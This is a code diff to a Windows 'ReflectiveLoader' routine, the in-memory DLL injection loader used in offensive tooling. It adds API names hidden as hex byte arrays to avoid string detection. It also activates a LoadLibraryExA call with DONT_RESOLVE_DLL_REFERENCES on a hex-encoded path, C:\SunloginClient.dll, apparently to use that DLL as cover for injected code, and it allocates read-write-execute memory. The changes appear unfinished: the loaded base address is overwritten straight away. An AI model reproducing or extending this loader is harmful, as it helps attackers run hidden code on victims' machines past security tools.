@@ -58,12 +58,14 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
 	// the functions we need
 	HMODULE hkernel32 = NULL;
 	LOADLIBRARYEXA pLoadLibraryExA = NULL;
+	GETLASTERROR pGetLastError = NULL;
+	OUTPUTDEBUGSTRINGA pOutPutDebugStringA = NULL;
 	VIRTUALPROTECT pVirtualProtectA = NULL;
 	LOADLIBRARYA pLoadLibraryA     = NULL;
 	GETPROCADDRESS pGetProcAddress = NULL;
 	VIRTUALALLOC pVirtualAlloc     = NULL;
 	NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = NULL;
-
+	
 	USHORT usCounter;
 
 	// the initial location of this image in memory
@@ -86,9 +88,11 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
 	ULONG_PTR uiValueD;
 	ULONG_PTR uiValueE;
 
-	char dllpath[] = { 0x43,0x3a,0x5c,0x53,0x75,0x6e,0x6c,0x6f,0x67,0x69,0x6e,0x43,0x6c,0x69,0x65,0x6e,0x74,0x2e,0x64,0x6c,0x6c,0x0 };
+	char dllpath[] = { 0x43,0x3A,0x5C,0x53,0x75,0x6E,0x6C,0x6F,0x67,0x69,0x6E,0x43,0x6C,0x69,0x65,0x6E,0x74,0x2E,0x64,0x6C,0x6C,0x0 };
 	char Str_VirtualProtectA[] = { 0x56,0x69,0x72,0x74,0x75,0x61,0x6c,0x50,0x72,0x6f,0x74,0x65,0x63,0x74,0x0 };
 	char Str_LoadLibraryExA[] = { 0x4c,0x6f,0x61,0x64,0x4c,0x69,0x62,0x72,0x61,0x72,0x79,0x45,0x78,0x41,0x0 };
+	char Str_OutPutDebugStringA[] = { 0x4F,0x75,0x74,0x70,0x75,0x74,0x44,0x65,0x62,0x75,0x67,0x53,0x74,0x72,0x69,0x6E,0x67,0x41,0x0 };
+	char Str_GetLastError[] = { 0x47,0x65,0x74,0x4C,0x61,0x73,0x74,0x45,0x72,0x72,0x6F,0x72, 0x0 };
 	// STEP 0: calculate our images current base address
 
 	// we will start searching backwards from our callers return address.
@@ -270,7 +274,7 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
 		// get the next entry
 		uiValueA = DEREF( uiValueA );
 	}
-
+	
 	// STEP 2: load our image into a new permanent location in memory...
 
 	// get the VA of the NT Header for the PE to be loaded
@@ -278,15 +282,23 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
 
 	// allocate all the memory for the DLL to be loaded into. we can load at any address because we will  
 	// relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.
-	if (pLoadLibraryA == NULL)
+	
+	if (!pGetProcAddress)
 		return 0;
-
 	pVirtualProtectA = (VIRTUALPROTECT)pGetProcAddress(hkernel32, Str_VirtualProtectA);
 	pLoadLibraryExA = (LOADLIBRARYEXA)pGetProcAddress(hkernel32, Str_LoadLibraryExA);
-//	uiBaseAddress = (ULONG_PTR)pLoadLibraryExA(dllpath, NULL, DONT_RESOLVE_DLL_REFERENCES);
+	pOutPutDebugStringA = (OUTPUTDEBUGSTRINGA)pGetProcAddress(hkernel32, Str_OutPutDebugStringA);
+	pGetLastError = (GETLASTERROR)pGetProcAddress(hkernel32, Str_GetLastError);
+
+	if (pLoadLibraryExA == NULL)
+		return 0;
+	uiBaseAddress = (ULONG_PTR)pLoadLibraryExA(dllpath, NULL, DONT_RESOLVE_DLL_REFERENCES);
 	//uiBaseAddress = (ULONG_PTR)pLoadLibraryA(dllpath);
 	if (uiBaseAddress == NULL)
 	{
+		
+		//pOutPutDebugStringA();
+		
 		return 0;
 	}
 	uiBaseAddress = (ULONG_PTR)pVirtualAlloc( NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
